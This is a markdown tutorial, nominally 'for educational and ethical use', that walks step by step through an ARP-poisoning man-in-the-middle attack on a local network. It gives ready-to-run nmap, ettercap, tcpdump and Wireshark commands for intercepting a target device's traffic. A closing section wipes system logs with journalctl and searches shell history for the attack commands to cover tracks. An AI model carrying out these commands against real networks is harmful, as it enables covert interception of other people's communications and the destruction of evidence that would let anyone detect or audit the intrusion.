
# ⚠️ MITM Attack Guide (Man-In-The-Middle)  
**For Educational & Ethical Use Only**

---

## ✅ Overview

This guide outlines how to perform a full MITM (Man-in-the-Middle) attack on a local network using ARP poisoning. You’ll intercept and analyze network traffic from a target device using tools like `ettercap`, `tcpdump`, and `Wireshark`.

---

## 🧰 Prerequisites

### 📦 Install Required Tools

```bash
sudo apt update
sudo apt install -y ettercap-text-only wireshark-qt dsniff arp-scan nmap
````

* `ettercap`: ARP poisoning & MITM attack engine
* `wireshark`: Network packet analyzer (GUI)
* `dsniff`: Network auditing toolset
* `arp-scan`: Device discovery
* `nmap`: Host and service discovery

---

## 🌐 Network Discovery

### 1. Identify Your Interface

```bash
ip addr show
```

Look for your WiFi interface (e.g., `wlo1`) with a valid local IP.

### 2. Discover Devices on the Network

```bash
nmap -sn 192.168.31.0/24
```

Find:

* Your IP
* Gateway (router)
* Target device(s)

### 3. Check ARP Table

```bash
arp -a
```

Shows known IP-to-MAC mappings on the LAN.

---

## 🧪 MITM Attack Execution

### 1. Enable IP Forwarding

```bash
sudo sysctl net.ipv4.ip_forward=1
```

This allows your machine to relay packets between the target and the router.

### 2. Launch ARP Spoofing Attack

```bash
sudo ettercap -T -M arp:remote /<router_ip>// /<target_ip>// -i <interface>
```

This poisons both the router and the target device ARP caches, rerouting their traffic through your system.

### 3. Verify Attack Is Running

```bash
ps aux | grep ettercap | grep -v grep
```

You should see a running ettercap process with target IPs and interface listed.

---

## 📥 Traffic Capture & Analysis

### Method 1: Command Line Sniffing

```bash
sudo tcpdump -i <interface> -n host <target_ip> -w capture.pcap
```

Analyze with:

```bash
sudo tcpdump -r capture.pcap -nn | head -20
```

### Method 2: GUI Analysis with Wireshark

```bash
sudo wireshark &
```

* Select your interface (e.g., `wlo1`)
* Apply filters like:

  * `ip.addr == <target_ip>`
  * `dns`
  * `tcp.port == 80`
  * `sip or rtp` (for VoIP)

---

## 🛑 Stopping & Cleaning Up

### 1. Stop Attack

Press `Ctrl+C` in the terminal running ettercap or tcpdump.

### 2. Manual Cleanup

```bash
sudo pkill ettercap tcpdump wireshark tshark
sudo sysctl net.ipv4.ip_forward=0

# Reset iptables
sudo iptables -F
sudo iptables -t nat -F
sudo iptables -t mangle -F
sudo iptables -X
sudo iptables -P INPUT ACCEPT
sudo iptables -P FORWARD ACCEPT
sudo iptables -P OUTPUT ACCEPT

# Clear ARP cache
sudo arp -d <router_ip>
sudo arp -d <target_ip>
sudo ip -s -s neigh flush all

# Refresh router/target ARP with arping (optional)
sudo arping -c 4 <router_ip>
sudo arping -c 4 <target_ip>
```

### 3. Restart Network Services

```bash
sudo systemctl restart NetworkManager
sudo ip link set wlo1 down
sudo ip link set wlo1 up
```

---

## 🧠 Key Learnings

* **MITM Positioning:** You can route traffic between LAN devices and observe it.
* **Traffic Interception:** DNS queries, connection metadata, and unencrypted protocols are fully visible.
* **Limitations:** Encrypted traffic (HTTPS, VPN, ESP) will remain unreadable but still traceable.

---

## 🔐 Post-Attack Security Audit

```bash
# Ensure forwarding is OFF
cat /proc/sys/net/ipv4/ip_forward

# Check for leftover attack processes
ps aux | grep -E "ettercap|tcpdump|wireshark" | grep -v grep

# Clean logs
sudo journalctl --rotate
sudo journalctl --vacuum-time=1s

# Clear sensitive shell history
history | grep -E "(ettercap|tcpdump|wireshark|arp)"
```



---

## 🗃️ Files Involved

* `capture.pcap` — Captured traffic file

---

## 🚨 Emergency Recovery (If Network Breaks)

```bash
sudo systemctl stop NetworkManager
sudo ip addr flush dev wlo1
sudo ip route flush table main
sudo systemctl start NetworkManager
sudo dhclient wlo1
```

---

